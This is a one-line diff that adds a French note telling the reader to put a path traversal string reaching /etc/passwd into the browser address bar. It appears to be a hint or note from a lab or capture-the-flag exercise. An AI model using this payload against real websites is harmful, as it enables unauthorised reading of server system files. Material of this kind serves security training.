@@ -1,0 +1,1 @@
+mettre /?page=../../../../../../../etc/passwd dans la barre d'adresse
